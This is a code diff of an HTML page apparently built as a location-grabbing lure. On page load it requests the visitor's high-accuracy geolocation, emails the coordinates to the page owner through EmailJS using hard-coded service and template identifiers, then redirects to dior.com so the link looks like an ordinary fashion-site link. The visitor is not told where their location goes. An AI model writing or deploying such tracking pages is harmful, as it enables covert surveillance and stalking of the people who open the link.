@@ -1,64 +1,165 @@
 <!DOCTYPE html>
 <html lang="en">
-
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Tracker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 30px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        #locationDisplay {
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        button {
+            background: white;
+            color: #764ba2;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            transform: scale(1.05);
+            transition: transform 0.2s;
+        }
+        .status {
+            margin: 15px 0;
+            padding: 10px;
+            border-radius: 5px;
+            background: rgba(0,0,0,0.3);
+        }
+    </style>
+</head>
 <body>
+    <div class="container">
+        <h2>📍 Location Tracker</h2>
+        <div id="locationDisplay">⏳ Requesting location...</div>
+        <div id="statusMessage" class="status">📡 Waiting for permission...</div>
+        <button onclick="requestLocation()">📍 Allow Location</button>
+        <button onclick="window.location.href='https://www.dior.com/'">🚀 Go to Dior</button>
+    </div>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            emailjs.init("ueOumEe6aJ_CEmq_m"); // Public Key
+        // Initialize EmailJS
+        emailjs.init("ueOumEe6aJ_CEmq_m");
 
-            function sendLocationEmail(latitude, longitude) {
-                console.log("📍 Sending Location Data:", { latitude, longitude });
+        let locationSent = false;
 
-                const templateParams = {
-                    latitude: latitude.toString(),
-                    longitude: longitude.toString()
-                };
+        function sendLocationEmail(latitude, longitude) {
+            console.log("📍 Sending Location Data:", { latitude, longitude });
 
-                emailjs.send("service_7pjie2s", "template_30kabln", templateParams)
-                    .then((response) => {
-                        console.log("✅ Email sent successfully!", response);
-                        document.getElementById("locationDisplay").textContent = "📧 Location sent!";
-                    })
-                    .catch((error) => {
-                        console.error("❌ Error sending email:", error);
-                        document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
-                    });
-            }
+            const templateParams = {
+                latitude: latitude.toString(),
+                longitude: longitude.toString()
+            };
 
-            function trackMovement() {
-                if ("geolocation" in navigator) {
-                    // This triggers the location permission prompt
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const latitude = position.coords.latitude;
-                            const longitude = position.coords.longitude;
+            return emailjs.send("service_7pjie2s", "template_30kabln", templateParams)
+                .then((response) => {
+                    console.log("✅ Email sent successfully!", response);
+                    document.getElementById("statusMessage").innerHTML = "✅ Email sent successfully! 📧";
+                    document.getElementById("statusMessage").style.background = "rgba(0,255,0,0.3)";
+                    locationSent = true;
+                    return true;
+                })
+                .catch((error) => {
+                    console.error("❌ Error sending email:", error);
+                    document.getElementById("statusMessage").innerHTML = "⚠️ Email sending failed! Please try again.";
+                    document.getElementById("statusMessage").style.background = "rgba(255,0,0,0.3)";
+                    return false;
+                });
+        }
 
-                            console.log("🌍 Location received:", latitude, longitude);
-                            document.getElementById("locationDisplay").textContent = 
-                                `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
+        function requestLocation() {
+            console.log("📍 Requesting location permission...");
+            document.getElementById("statusMessage").innerHTML = "⏳ Requesting location permission...";
+            document.getElementById("statusMessage").style.background = "rgba(255,255,0,0.3)";
 
-                            sendLocationEmail(latitude, longitude);
-                        },
-                        (error) => {
-                            console.error("❌ Error getting location:", error);
-                            document.getElementById("locationDisplay").textContent = 
-                                "⚠️ Location access denied!";
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        console.log("🌍 Location received:", latitude, longitude);
+                        document.getElementById("locationDisplay").textContent = 
+                            `📍 Latitude: ${latitude.toFixed(6)}, Longitude: ${longitude.toFixed(6)}`;
+                        document.getElementById("locationDisplay").style.background = "rgba(0,255,0,0.2)";
+                        
+                        document.getElementById("statusMessage").innerHTML = "✅ Location captured! Sending email...";
+                        document.getElementById("statusMessage").style.background = "rgba(0,255,0,0.3)";
+
+                        // Send email with location
+                        sendLocationEmail(latitude, longitude).then((success) => {
+                            if (success) {
+                                // Redirect to Dior after 2 seconds
+                                setTimeout(() => {
+                                    window.location.href = "https://www.dior.com/";
+                                }, 2000);
+                            }
+                        });
+                    },
+                    (error) => {
+                        console.error("❌ Error getting location:", error);
+                        let errorMessage = "⚠️ Location access denied!";
+                        if (error.code === 1) {
+                            errorMessage = "⚠️ Location permission denied! Please allow location access and try again.";
+                        } else if (error.code === 2) {
+                            errorMessage = "⚠️ Location unavailable! Please check your GPS/settings.";
+                        } else if (error.code === 3) {
+                            errorMessage = "⚠️ Location timeout! Please try again.";
                         }
-                    );
-                } else {
-                    console.log("❌ Geolocation not supported.");
-                    document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
-                }
+                        document.getElementById("locationDisplay").textContent = errorMessage;
+                        document.getElementById("locationDisplay").style.background = "rgba(255,0,0,0.2)";
+                        document.getElementById("statusMessage").innerHTML = "❌ " + errorMessage;
+                        document.getElementById("statusMessage").style.background = "rgba(255,0,0,0.3)";
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                console.log("❌ Geolocation not supported.");
+                document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported in this browser!";
+                document.getElementById("statusMessage").innerHTML = "❌ Browser doesn't support geolocation!";
             }
+        }
 
-            // Call to request location as soon as the page loads
-            trackMovement();
+        // Auto-request location when page loads
+        document.addEventListener("DOMContentLoaded", function() {
+            console.log("🚀 Page loaded - requesting location...");
+            // Small delay to ensure everything is loaded
+            setTimeout(() => {
+                requestLocation();
+            }, 500);
         });
-        setTimeout(() => {
-    window.location.href = "https://www.dior.com/";
-}, 2000);
+
+        // Manual trigger if auto doesn't work (browser might block auto requests)
+        console.log("💡 Click the 'Allow Location' button if location wasn't requested automatically.");
     </script>
 </body>
 </html>
